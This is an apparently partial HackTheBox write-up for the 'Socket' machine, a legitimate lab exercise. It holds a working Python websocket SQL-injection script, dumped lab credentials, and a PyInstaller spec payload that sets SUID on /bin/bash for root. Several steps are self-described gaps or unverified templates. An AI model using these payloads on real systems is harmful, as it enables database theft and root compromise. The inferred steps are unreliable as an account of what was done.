# HackTheBox — Socket

![OS: Linux](https://img.shields.io/badge/OS-Linux-blue)
![Difficulty: Medium](https://img.shields.io/badge/Difficulty-Medium-yellow)
![Tags: websocket, sqli, pyinstaller](https://img.shields.io/badge/Tags-WebSocket%20%7C%20SQLi%20%7C%20PyInstaller-orange)

> 🚧 **[partial — original has the SQLi exploit script and final creds; full narrative needs filling]**

---

## Attack Chain at a Glance

```
nmap → 80/tcp Apache (qreader.htb), 5789/tcp Python websockets/10.4
   → custom websocket protocol on /version → SQLi via crafted JSON
   → UNION SELECT → users table → tkeller:denjanjade122566
   → SSH as tkeller → user.txt
   → sudo -l → tkeller can run pyinstaller (or similar) to build /home/tkeller/gimmeroot.spec
   → spec file embeds os.system('/bin/bash') → root.txt
```

---

## Reconnaissance

### Nmap Scan

<details>
<summary>Click to expand</summary>

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://qreader.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
5789/tcp open  unknown
| fingerprint-strings:
|   GenericLines, GetRequest, HTTPOptions, RTSPRequest:
|     HTTP/1.1 400 Bad Request
|     Server: Python/3.10 websockets/10.4
|     Failed to open a WebSocket connection: did not receive a valid HTTP request.
```

</details>

| Port | Service | Notes |
|------|---------|-------|
| 22   | SSH     | OpenSSH 8.9p1 |
| 80   | HTTP    | Apache 2.4.52 — Flask app at `qreader.htb` |
| 5789 | WS      | Python `websockets/10.4` server |

> 💡 The `Server: Python/3.10 websockets/10.4` banner identifies the [`websockets` library](https://websockets.readthedocs.io/) — a popular asyncio-based websocket framework. The protocol on top of it is custom JSON.

> 🚧 **[gap]** — the application's web UI on port 80 (presumably the `qreader.htb` Flask app) and how it ties into the websocket service isn't documented. Likely the web UI tells you the websocket endpoint exists and what messages it accepts (`/version`).

---

## Initial Foothold — WebSocket SQL Injection

The `/version` endpoint accepts a JSON message containing a `version` field, which is reflected unsanitized into a SQL query:

```python
from websocket import create_connection
import json

ws_server = "ws://qreader.htb:5789/version"

payloads = [
    {"version": "0.0.2\" UNION ALL SELECT 1, database(), 3, 4 --"},
    {"version": "0.0.2\" UNION ALL SELECT * FROM answers --"},
    {"version": "0.0.2\" UNION ALL SELECT * FROM users --"},
    {"version": "0.0.2\" UNION SELECT group_concat(answer), \"2\",\"3\",\"4\" FROM answers; --"},
]


def send_ws(payload):
    ws = create_connection(ws_server)
    try:
        data = json.dumps(payload)
        ws.send(data)
        resp = ws.recv()
    finally:
        ws.close()
    return resp or ''


def main():
    for payload in payloads:
        response = send_ws(payload)
        print("Response:", response + '\n')


if __name__ == "__main__":
    main()
```

The injection breaks out of the SQL string literal with `\"`, then UNIONs in arbitrary tables. From the dumped `users` table:

```
tkeller : denjanjade122566
```

> 🚧 **[gap]** — no automation tool used here, but the same pattern is wrappable for `sqlmap` if you tunnel the websocket through an HTTP proxy.

---

## User Flag

```bash
ssh tkeller@qreader.htb
# password: denjanjade122566
cat ~/user.txt
```

🚩 **User flag captured.**

---

## Privilege Escalation — PyInstaller Spec Injection

Original notes:

> **"priv esc through sudo -l, build /home/tkeller/gimmeroot.spec (python os.command(/bin/bash))"**

Inferred path:

1. `sudo -l` reveals `tkeller` can run `pyinstaller` (or similar) as root against `*.spec` files.
2. PyInstaller `.spec` files are *Python scripts* — they execute arbitrary code at build time.
3. Drop `gimmeroot.spec` containing `os.system('/bin/bash')` (or `chmod u+s /bin/bash`).
4. Run via the sudo rule. Spec executes as root → root shell.

> 🚧 **[gap]** — exact `sudo -l` output and the full spec-file payload not preserved.

Example spec-file payload (template, not from original notes):

```python
# gimmeroot.spec — unverified template, replace with original payload when found
import os
os.system('chmod u+s /bin/bash')
```

---

## Root Flag

> 🚧 **[incomplete]**

---

## Lessons Learned

- **WebSockets are just HTTP requests with framing.** Every parameter in a websocket message is potentially injectable, and the same SQLi/SSRF/RCE primitives apply. Most automated scanners ignore `ws://` URLs — write a small Python loop instead.
- **PyInstaller spec files are Python.** Anywhere a build tool's "config" is in fact a script, sudo rules letting users build are sudo rules letting users execute arbitrary code as root. Same applies to `setup.py`, `Rakefile`, `Makefile`, `Brewfile`, `package.json` postinstall scripts, etc.
- **Custom protocols still need backend code.** A Python `websockets` server still talks to a SQL database; the bug surface is the same.

---

## Tools Referenced

| Tool | Purpose |
|------|---------|
| [`websocket-client`](https://pypi.org/project/websocket-client/) | The `create_connection` library used by the SQLi script |
| [`websockets`](https://websockets.readthedocs.io/) | The vulnerable server-side library (Python `websockets/10.4`) |
